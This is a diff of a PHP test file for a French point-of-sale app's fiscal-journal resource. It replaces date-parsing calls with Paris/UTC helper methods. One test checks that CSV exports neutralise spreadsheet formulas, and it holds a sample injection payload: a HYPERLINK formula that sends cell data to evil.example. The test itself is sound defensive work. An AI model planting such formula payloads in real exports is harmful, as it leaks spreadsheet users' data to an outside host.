@@ -22,7 +22,6 @@ use App\Filament\App\Resources\EnregistrementFiscalResource\Pages\ListEnregistre
 use App\Filament\App\Resources\EnregistrementFiscalResource\Pages\ViewEnregistrementFiscal;
 use App\Filament\App\Resources\EnregistrementFiscalResource\Widgets\ConformiteApercu;
 use App\Models\User;
-use Carbon\CarbonImmutable;
 use Filament\Facades\Filament;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Support\Arr;
@@ -216,7 +215,7 @@ class EnregistrementFiscalResourceTest extends TestCase
      */
     public function test_l_evenement_de_cloture_nomme_son_ticket_z(): void
     {
-        $this->travelTo('2026-10-09 10:00:00');
+        $this->travelTo(self::aParis('2026-10-09 10:00:00'));
         $magasin = $this->connecterProprietaire();
         $cloture = app(CloturerCaisseAction::class)->handle(self::auteur(), $magasin, now());
 
@@ -246,7 +245,7 @@ class EnregistrementFiscalResourceTest extends TestCase
 
     public function test_les_horodatages_s_affichent_a_l_heure_de_paris(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 08:15:30', 'UTC'));
+        $this->travelTo(self::enUtc('2026-10-20 08:15:30'));
         $this->connecterProprietaire();
         $evenement = $this->journaliser(CodeEvenement::ExportDeDonnees);
 
@@ -287,10 +286,10 @@ class EnregistrementFiscalResourceTest extends TestCase
      */
     public function test_le_filtre_par_periode_compte_les_jours_a_l_heure_de_paris(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 23:30:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 23:30:00'));
         $this->connecterProprietaire();
         $leVingt = $this->journaliser(CodeEvenement::ExportDeDonnees);
-        $this->travelTo(CarbonImmutable::parse('2026-10-21 00:30:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-21 00:30:00'));
         $leVingtEtUn = $this->journaliser(CodeEvenement::ExportDeDonnees);
         $initialisation = EnregistrementFiscal::query()->where('type', '260')->sole();
 
@@ -302,11 +301,11 @@ class EnregistrementFiscalResourceTest extends TestCase
 
     public function test_l_export_csv_du_journal_contient_les_colonnes_attendues_et_s_inscrit_au_journal(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 10:00:00'));
         $this->connecterProprietaire();
         $this->journaliser(CodeEvenement::ParametreDeConformite, ['parametre' => 'regime_tva', 'ancienne_valeur' => null, 'nouvelle_valeur' => 'reel_simplifie']);
         $this->vendre();
-        $this->travelTo(CarbonImmutable::parse('2026-10-22 09:30:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-22 09:30:00'));
 
         $composant = Livewire::test(ListEnregistrementsFiscaux::class)
             ->callAction('exporter_journal', ['du' => '2026-10-20', 'au' => '2026-10-22']);
@@ -348,7 +347,7 @@ class EnregistrementFiscalResourceTest extends TestCase
      */
     public function test_l_export_csv_ne_laisse_aucune_formule_venue_de_l_utilisateur(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 10:00:00'));
         $proprietaire = User::factory()->create(['name' => '@SOMME(A1:A9)']);
         $magasin = $this->magasinDe($proprietaire);
         $navigateur = '=HYPERLINK("https://evil.example/?d="&A1;"Cliquez")';
@@ -376,7 +375,7 @@ class EnregistrementFiscalResourceTest extends TestCase
      */
     public function test_seul_le_proprietaire_lit_l_adresse_ip_et_le_navigateur_d_un_evenement(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 10:00:00'));
         $proprietaire = User::factory()->create();
         $magasin = $this->magasinDe($proprietaire);
         $comptable = $this->membre($magasin, RoleMagasin::Vendeur, self::casesDeLAncienComptable(), ['name' => 'Camille', 'email' => 'camille@example.test']);
@@ -423,7 +422,7 @@ class EnregistrementFiscalResourceTest extends TestCase
      */
     public function test_l_export_du_journal_ne_contient_aucun_evenement_d_un_autre_magasin_de_la_societe(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 10:00:00'));
         $lyon = $this->connecterProprietaire();
         $villeurbanne = $this->ouvrirUnAutreMagasin($lyon, ['nom' => 'Villeurbanne']);
         app(TenantContext::class)->runAs($villeurbanne, fn () => $this->journaliser(CodeEvenement::ParametreDeConformite, ['parametre' => 'regime_tva', 'ancienne_valeur' => null, 'nouvelle_valeur' => 'reel_simplifie']));
@@ -444,12 +443,12 @@ class EnregistrementFiscalResourceTest extends TestCase
 
     public function test_l_export_ne_reprend_que_les_evenements_de_la_periode(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 10:00:00'));
         $this->connecterProprietaire();
         $this->journaliser(CodeEvenement::ExportDeDonnees);
-        $this->travelTo(CarbonImmutable::parse('2026-10-21 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-21 10:00:00'));
         $this->journaliser(CodeEvenement::ParametreDeConformite, ['parametre' => 'regime_tva', 'ancienne_valeur' => null, 'nouvelle_valeur' => 'reel_simplifie']);
-        $this->travelTo(CarbonImmutable::parse('2026-10-22 10:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-22 10:00:00'));
 
         $composant = Livewire::test(ListEnregistrementsFiscaux::class)
             ->callAction('exporter_journal', ['du' => '2026-10-21', 'au' => '2026-10-21']);
@@ -528,7 +527,7 @@ class EnregistrementFiscalResourceTest extends TestCase
 
     public function test_le_widget_conformite_montre_la_derniere_verification(): void
     {
-        $this->travelTo(CarbonImmutable::parse('2026-10-20 03:00:00', 'Europe/Paris'));
+        $this->travelTo(self::aParis('2026-10-20 03:00:00'));
         $this->connecterProprietaire();
         Livewire::test(ConformiteApercu::class)->assertSee('Jamais');
 
